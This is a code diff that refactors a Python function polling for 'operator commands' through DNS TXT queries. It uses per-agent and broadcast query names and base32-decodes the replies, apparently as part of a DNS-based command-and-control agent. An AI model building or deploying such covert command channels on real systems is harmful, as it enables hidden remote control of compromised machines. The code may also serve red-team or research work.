@@ -255,26 +255,20 @@ def poll_command_once(domain: str, dns_server: str, agent_id: str = None) -> str
     """
     Check for a pending operator command.
 
-    Checks command.<agent_id>.<domain> first (per-agent slot set by the server),
-    then falls back to command.<domain> (broadcast to all agents).
-    Returns the decoded command string, or None if no command is queued.
+    When agent_id is set, queries command.<agent_id>.<domain> only — the server
+    already falls back to the global broadcast slot when no per-agent command is
+    queued, so a second query to command.<domain> would be redundant.
+    When agent_id is absent (standalone / no --remote), queries command.<domain>.
+    Returns the decoded command string, or None if nothing is queued.
     """
-    def _decode(txt: str) -> str | None:
-        if txt is None or txt.upper() == "NONE":
-            return None
-        try:
-            return _b32dec(txt).decode("utf-8")
-        except Exception:
-            return txt
-
-    if agent_id:
-        txt = _extract_txt(_query_txt(f"command.{agent_id}.{domain}", dns_server))
-        cmd = _decode(txt)
-        if cmd is not None:
-            return cmd
-
-    txt = _extract_txt(_query_txt(f"command.{domain}", dns_server))
-    return _decode(txt)
+    qname = f"command.{agent_id}.{domain}" if agent_id else f"command.{domain}"
+    txt = _extract_txt(_query_txt(qname, dns_server))
+    if txt is None or txt.upper() == "NONE":
+        return None
+    try:
+        return _b32dec(txt).decode("utf-8")
+    except Exception:
+        return txt
 
 
 def start_command_poll(
